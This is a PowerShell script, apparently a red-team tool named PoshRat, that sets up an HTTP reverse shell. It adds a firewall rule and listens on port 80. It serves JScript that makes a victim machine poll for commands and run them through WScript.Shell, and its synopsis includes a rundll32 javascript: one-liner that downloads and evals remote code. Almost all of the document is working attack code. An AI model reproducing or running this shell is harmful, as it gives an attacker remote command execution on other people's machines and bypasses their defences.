<#
    
  Author: Casey Smith @subTee

  License: BSD3-Clause
	
  .SYNOPSIS
  
  Simple Reverse Shell over HTTP. Execute Commands on Client.  
  
  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();ie=new%20ActiveXObject("InternetExplorer.Application");ie.Navigate("http://127.0.0.1/connect");while(ie.ReadyState!=4){a=1;}s=ie.document.body.innerText;eval(s);
  
  Listening Server IP Address
  
#>

$Server = '127.0.0.1' #Listening IP. Change This.


function Receive-Request {
   param(      
      $Request
   )
   $output = ""
   $size = $Request.ContentLength64 + 1   
   $buffer = New-Object byte[] $size
   do {
      $count = $Request.InputStream.Read($buffer, 0, $size)
      $output += $Request.ContentEncoding.GetString($buffer, 0, $count)
   } until($count -lt $size)
   $Request.InputStream.Close()
   write-host $output
}

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add('http://+:80/') 

netsh advfirewall firewall delete rule name="PoshRat 80" | Out-Null
netsh advfirewall firewall add rule name="PoshRat 80" dir=in action=allow protocol=TCP localport=80 | Out-Null

$listener.Start()
'Listening ...'
while ($true) {
    $context = $listener.GetContext() # blocks until request is received
    $request = $context.Request
    $response = $context.Response
	$hostip = $request.RemoteEndPoint
	$init = $true
	#Use this for One-Liner Start
	if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq "GET")) {  
     write-host "Host Connected" -fore Cyan
        $message = '
					while(true)
					{
						var ie = new ActiveXObject("InternetExplorer.Application");						
						ie.Navigate('''+$Server+'/rat'');
						while(ie.ReadyState!=4){a=1;};
						var c = ie.document.body.innerText;
						var r = new ActiveXObject("WScript.Shell");
						r.Exec(c);
						ie.Quit();
					}
					
		'

    }		 
	
	if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "POST") ) { 
		Receive-Request($request)	
	}
    if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "GET")) {  
        $message = Read-Host "JS $hostip>"
		
		
    }
    

    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
    $response.ContentLength64 = $buffer.length
    $output = $response.OutputStream
    $output.Write($buffer, 0, $buffer.length)
    $output.Close()
}

$listener.Stop()
